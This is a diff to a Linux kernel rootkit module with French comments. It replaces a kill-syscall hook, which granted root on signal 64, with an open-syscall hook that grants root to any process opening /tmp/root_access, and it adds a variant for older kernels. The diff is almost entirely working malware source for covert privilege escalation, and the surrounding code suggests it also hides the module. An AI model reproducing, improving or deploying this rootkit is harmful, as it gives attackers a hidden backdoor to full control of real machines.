@@ -45,35 +45,48 @@ void hideme(void)
  //// GIVE ROOT PRIVILEGE TO A USER //////
 /////////////////////////////////////////
 
-// check la version du kernel, pt_regs pour les syscall en 4.17 ou plus
-#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
-#define PTREGS_SYSCALL_STUBS 1
-#endif
-
 // si PTREGS_SYSCALL_STUBS est défini, on inclut les stubs pour les syscall
 #ifdef PTREGS_SYSCALL_STUBS
-// Pointeur vers la f° kill pour save ses fonction d'origine
-static asmlinkage long (*orig_kill)(const struct pt_regs *);
+// Pointeur vers la f° open pour save ses fonction d'origine
+static asmlinkage long (*orig_open)(const struct pt_regs *);
 
 // f° hooké qui remplace le syscall kill
-asmlinkage int hook_kill(const struct pt_regs *regs)
+asmlinkage int hook_open(const struct pt_regs *regs)
 {
     void set_root(void);
 
-    // on récupère le signal
-    int sig = regs->si;
+    // Obtenir le nom du fichier que l'utilisateur essaie d'ouvrir
+    char __user *filename = (char *) regs->di;
 
-    // on se sert du signal 64 parceque gloabalement il sert a rien (ou jamais du moins)
-    if ( sig == 64 )
+    // Vérifier si le fichier demandé est /tmp/root_access
+    if (strcmp(filename, "/tmp/root_access") == 0)
     {
+        printk(KERN_INFO "rootkit: Giving root privilege ...\n");
         set_root();
         return 0;
     }
 
-    // si c'est pas le flag 64, on appelle la f° d'origine
-    return orig_kill(regs);
+    // si c'est pas le bon fichier, on appelle la f° d'origine
+    return orig_open(regs);
 }
 
+#else
+static asmlinkage long (*orig_open)(const char __user *filename, int flags, mode_t mode);
+
+static asmlinkage int hook_open(const char __user *filename, int flags, mode_t mode)
+{
+    void set_root(void);
+
+    if (strcmp(filename, "/tmp/root_access") == 0)
+    {
+        printk(KERN_INFO "rootkit: Giving root access via open...\n");
+        set_root();
+        return 0;
+    }
+
+    return orig_open(filename, flags, mode);
+}
+#endif
 void set_root(void)
 {
     struct cred *root;
